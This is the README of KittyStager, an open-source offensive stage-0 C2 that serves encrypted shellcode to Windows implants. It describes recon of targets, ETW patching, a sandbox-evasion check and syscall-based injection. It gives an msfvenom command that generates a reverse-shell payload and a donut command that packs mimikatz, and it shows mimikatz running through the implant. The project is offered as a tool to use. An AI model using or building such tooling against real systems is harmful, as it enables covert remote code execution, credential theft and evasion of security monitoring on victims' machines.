# KittyStager


<p align="center">
  <a href="" rel="noopener">
 <img width=200px height=200px src="./img/chat.png"> </a>
</p>


KittyStager is a simple stage 0 C2. It is made of a web server to host the shellcode and an implant, called kitten.
The purpose of this project is to be able to have a web server and some implant for various usage and be 
able to use it with any shellcode.

KittyStager has :
- A web server to host the shellcode
- Some kittens (implants) to execute the shellcode
- A simple cli to interact with the web server
- A user agent whitelist to prevent unwanted connections
- A basic recon to get some information about the target
  - The hostname (used to cypher the shellcode)
  - The username
  - The private IP
  - The program file content
- An AES encryption to encrypt the shellcode with a none hardcoded key


**I would not use this project in red team, at least not now.**



## Content
- [How it works](#how-it-works)
- [Quick start](#quick-start)
- [Kitten](#Kitten)
- [Project structure](#project-structure)
- [TODO](#todo)


## How it works

1. Configure all the settings in the config file
2. Start the server
    1. The server will start
    2. A config file will be created with each kitten
    3. It will configure the default sleep time for the fist callback
3. Compile the kitten
4. Run the kitten
5. Host the shellcode for the kitten

![](/img/workflow.svg)

## Quick start
The kittens are for windows only, but the server can be run on any OS.

How to compile :
```
go build
./kittyStager

cd /kitten/basickitten
go build -o basickitten
./basickitten
```
### How to use :
Generate a shellcode. It works with a shellcode in bin format or in hex format.

#### msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
```
#### donut
```
go-donut.exe -i mimikatz.exe
```
#### Cobalt Strike
Generate staged payload in raw format

### Config file
The default config file under `KittyStager/cmd/config` :
```yaml
Http:
  host: "127.0.0.1"
  port: 8080
  endpoint: "/legit"
  sleep: 5
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0"
  malPath:
    - "kitten/basicKitten/"
    - "kitten/bananaKitten/"
```
### Example
KittyStager :
![](/img/Kitty16.png)
![](/img/Kitty17.png)
![](/img/Kitty10.png)
![](/img/Kitty11.png)
![](/img/Kitty12.png)
![](/img/Kitty18.png)
![](/img/Kitty13.png)

Kitten :
```
~basicKitten ❯ .\basicKitten.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

## Project structure
### [kitten](/kitten)
This is the folder where all the kittens are stored. Each kitten has its own folder.
#### [BasicKitten](/kitten/basicKitten)
This is the basic kitten, and it has the minimum to work. No fancy injection method, just a
`VirtualAlloc` -> `RtlCopyMemory` -> `VirtualProtect` -> `CreateThread` -> `WaitForSingleObject`. Use this as example if you want to develop your own kitten.
#### [BananaKitten](/kitten/bananaKitten)
`NtAllocateVirtualMemorySysid` -> `NtProtectVirtualMemorySysid` -> `NtCreateThreadExSysid` -> `NtWaitForSingleObject`
This is the more advanced kitten. It will use bananaphone, a variant of hell's gate implemented in Go. [https://github.com/C-Sto/BananaPhone](https://github.com/C-Sto/BananaPhone)

It also patches etw and has a sandbox escape mechanism, that check's if there is more than 1 Gb of ram. If not, it will exit.

### [cmd](/cmd)
#### [kittyStager](/cmd/kittyStager)
Main file of the project. It will start the server and create the config file for each kitten.
#### [config](/cmd/config)
Used to read and check the config file. The config file is `conf.yml`
#### [http](/cmd/http)
Used to start the server and serve the shellcode.
#### [cli](/cmd/cli)
This is the cli to interact with the server.
#### [interact](/cmd/interact)
This is the cli to interact with a kitten, select a shellcode or change sleep time. 
#### [util](/cmd/util)
It contains all the util functions used in the project.
#### [cryptoUtil](/cmd/cryptoUtil)
It contains all the util functions used to encrypt and decrypt the shellcode.
#### [httpUtil](/cmd/httpUtil)
It contains all the util functions used to interact with the server.
#### [malwareUtil](/cmd/malwareUtil)
It contains all the functions used only by the kittens

## TODO
- [ ] Add more kittens (vba, powershell, c#, c)
- [ ] Https